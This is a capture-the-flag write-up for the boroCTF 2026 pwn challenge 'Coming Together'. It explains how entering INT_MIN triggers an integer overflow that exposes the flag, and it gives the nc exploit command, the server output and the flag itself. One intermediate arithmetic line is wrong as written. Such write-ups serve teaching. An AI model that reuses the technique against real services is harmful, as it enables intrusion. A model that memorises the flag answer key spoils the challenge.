# boroCTF 2026 — Coming Together (Pwn, 100pts)

**Author:** Franklin  
**Category:** Pwn  

## Description

> You have yours and I have mine. Together we have something larger than ourselves.

## Files

- `chal` — ELF 64-bit executable
- Server: `nc oq7qaruz5vsw.boroctf.com 25287`

---

## Solution

### Step 1 — Understand the program

Decompiling in Ghidra reveals the full logic of `main`:

```c
bool main(void) {
    uint uVar1;
    int local_7c;
    char local_64[12];
    char local_58[72];

    puts("What number will you contribute?");
    fgets(local_64, 0xc, stdin);
    local_7c = atoi(local_64);          // convert input to int

    if (10000 < local_7c) {
        puts("Wow there, try not to out do my number too much.");
        local_7c = 1;                   // cap at 1 if too large
    }
    if (local_7c < 0) {
        puts("No negatives!");
        local_7c = -local_7c;           // flip sign if negative
    }

    uVar1 = local_7c + 2;              // add the program's number (2)

    if (-1 < (int)uVar1) {
        printf("Our total is %d! Good work everyone!\n", (ulong)uVar1);
    } else {
        puts("Huh? That's not supposed to happen.");
        __stream = fopen("flag.txt", "r");
        fgets(local_58, 0x40, __stream);
        puts(local_58);                 // print the flag
    }
}
```

To reach the flag, `(int)uVar1` must be negative (≤ -1). The program adds 2 to our input and stores the result in a `uint` (unsigned 32-bit integer). To make a `uint` appear negative when cast to `int`, we need integer overflow.

### Step 2 — Find the vulnerability

The key insight is two's complement representation. In 32-bit signed integers:

- Maximum `int`: `2147483647` (0x7FFFFFFF)  
- Minimum `int`: `-2147483648` (0x80000000)

The program tries to block negative numbers with `local_7c = -local_7c`. But what happens when we input the minimum possible `int` value, `-2147483648`?

```
-(-2147483648) = 2147483648
```

But `2147483648` exceeds the maximum positive value of a signed 32-bit integer by exactly 1. This causes **integer overflow** — the result wraps back around to `-2147483648`. The negation has no effect.

So after the "No negatives!" check, `local_7c` is still `-2147483648`.

### Step 3 — Trigger the overflow

```c
uVar1 = local_7c + 2;
// = -2147483648 + 2
// As uint: 4294967295 - 2147483648 + 2 = 2147483650
```

`2147483650` stored as `uint` but cast to `int` gives `-2147483646` — negative. The condition `if (-1 < (int)uVar1)` fails, and the program opens `flag.txt`.

### Step 4 — Exploit

Test locally (segfaults because `flag.txt` doesn't exist, but the right branch is reached):

```bash
echo "-2147483648" | ./chal
```

Run on the server:

```bash
echo "-2147483648" | nc oq7qaruz5vsw.boroctf.com 25287
```

Output:
```
What number will you contribute?
No negatives!
Huh? That's not supposed to happen.
boroCTF{tw0s_c0mpl3men+_M3}
```

---

## Flag

```
boroCTF{tw0s_c0mpl3men+_M3}
```

---

## Key takeaways

- **Two's complement** is the standard way signed integers are stored in memory. It causes `-(INT_MIN) = INT_MIN` because the result of negation doesn't fit in the same type
- **Integer overflow** happens silently in C — no exception, no error, just wraparound. This is one of the most common sources of vulnerabilities in C programs
- The `u` prefix in Ghidra variable names (e.g. `uVar1`) means **unsigned** — the same bits interpreted differently give a completely different value when cast between `int` and `uint`
- In PWN challenges, you download the binary to analyze it locally (Ghidra, GDB), write your exploit, test it locally, then run it against the server via `nc` to get the real flag
- `echo "input" | nc host port` is a quick way to send a single line to a remote service without an interactive session
